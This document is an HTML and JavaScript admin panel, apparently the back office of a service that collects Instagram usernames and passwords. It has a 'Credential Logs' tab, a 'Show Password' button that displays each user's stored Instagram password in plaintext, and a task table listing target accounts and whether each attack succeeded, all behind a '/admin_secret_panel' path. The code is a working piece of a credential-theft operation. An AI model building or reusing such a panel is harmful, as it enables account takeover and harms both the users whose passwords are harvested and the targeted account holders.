<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Paneli</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f0f;
            color: #fff;
            padding: 20px;
        }
        
        .header {
            background: #1a1a1a;
            color: white;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #333;
        }
        
        h1 {
            font-size: 2em;
        }
        
        .logout-btn {
            background: #667eea;
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
        }
        
        .logout-btn:hover {
            background: #5568d3;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 12px 20px;
            background: #1a1a1a;
            border: 1px solid #333;
            cursor: pointer;
            font-weight: 600;
            color: #ccc;
            border-radius: 5px;
        }
        
        .tab.active {
            background: #667eea;
            color: white;
            border-color: #667eea;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .panel {
            background: #1a1a1a;
            border-radius: 10px;
            padding: 25px;
            border: 1px solid #333;
            margin-bottom: 20px;
        }
        
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 1.5em;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table th {
            background: #0f0f0f;
            padding: 12px;
            text-align: left;
            font-weight: 600;
            color: #ccc;
            border-bottom: 2px solid #333;
        }
        
        .table td {
            padding: 12px;
            border-bottom: 1px solid #333;
            color: #ccc;
        }
        
        .table tr:hover {
            background: #252525;
        }
        
        .log-container {
            background: #000;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        
        .log-line {
            padding: 3px 0;
            border-bottom: 1px solid #111;
        }
        
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
        }
        
        button:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚙️ Admin Panel</h1>
        <button class="logout-btn" onclick="logout()">Logout</button>
    </div>
    
    <div class="container">
        <div class="tabs">
            <button class="tab active" onclick="switchTab('users')">👥 Users</button>
            <button class="tab" onclick="switchTab('tasks')">📋 Tasks</button>
            <button class="tab" onclick="switchTab('logs')">🔐 Credential Logs</button>
        </div>
        
        <div id="users" class="tab-content active">
            <div class="panel">
                <h2>Registered Users</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Instagram Username</th>
                            <th>Registered</th>
                            <th>Last Login</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody id="users_table"></tbody>
                </table>
            </div>
        </div>
        
        <div id="tasks" class="tab-content">
            <div class="panel">
                <h2>All Tasks</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>User</th>
                            <th>Target</th>
                            <th>Status</th>
                            <th>Success</th>
                            <th>Date</th>
                        </tr>
                    </thead>
                    <tbody id="tasks_table"></tbody>
                </table>
            </div>
        </div>
        
        <div id="logs" class="tab-content">
            <div class="panel">
                <h2>Credential Logs</h2>
                <button onclick="loadLogs()" style="margin-bottom: 15px;">🔄 Refresh</button>
                <div class="log-container" id="logs_container"></div>
            </div>
        </div>
    </div>
    
    <script>
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
            
            if (tabName === 'users') loadUsers();
            if (tabName === 'tasks') loadTasks();
            if (tabName === 'logs') loadLogs();
        }
        
        async function logout() {
            await fetch('/api/admin/logout', {method: 'POST'});
            window.location.href = '/admin_secret_panel';
        }
        
        async function loadUsers() {
            try {
                const response = await fetch('/api/admin/all_users');
                const users = await response.json();
                
                const tbody = document.getElementById('users_table');
                tbody.innerHTML = '';
                
                users.forEach(user => {
                    tbody.innerHTML += `
                        <tr>
                            <td>${user.id}</td>
                            <td>${user.username}</td>
                            <td>${user.created}</td>
                            <td>${user.last_login || 'Never'}</td>
                            <td><button onclick="showCredentials(${user.id})">Show Password</button></td>
                        </tr>
                    `;
                });
            } catch (error) {
                console.error(error);
            }
        }
        
        async function loadTasks() {
            try {
                const response = await fetch('/api/admin/all_tasks');
                const tasks = await response.json();
                
                const tbody = document.getElementById('tasks_table');
                tbody.innerHTML = '';
                
                tasks.forEach(task => {
                    tbody.innerHTML += `
                        <tr>
                            <td>${task.id}</td>
                            <td>${task.user}</td>
                            <td>@${task.target}</td>
                            <td>${task.status}</td>
                            <td>${task.success ? '✅' : '❌'}</td>
                            <td>${task.created}</td>
                        </tr>
                    `;
                });
            } catch (error) {
                console.error(error);
            }
        }
        
        async function showCredentials(userId) {
            try {
                const response = await fetch(`/api/admin/credentials/${userId}`);
                const data = await response.json();
                alert(`Username: ${data.username}\nPassword: ${data.password}`);
            } catch (error) {
                alert('Error loading credentials');
            }
        }
        
        async function loadLogs() {
            try {
                const response = await fetch('/api/admin/all_logs');
                const data = await response.json();
                
                const container = document.getElementById('logs_container');
                container.innerHTML = '';
                
                data.logs.forEach(log => {
                    const line = document.createElement('div');
                    line.className = 'log-line';
                    line.textContent = log;
                    container.appendChild(line);
                });
                
                container.scrollTop = container.scrollHeight;
            } catch (error) {
                console.error(error);
            }
        }
        
        loadUsers();
    </script>
</body>
</html>
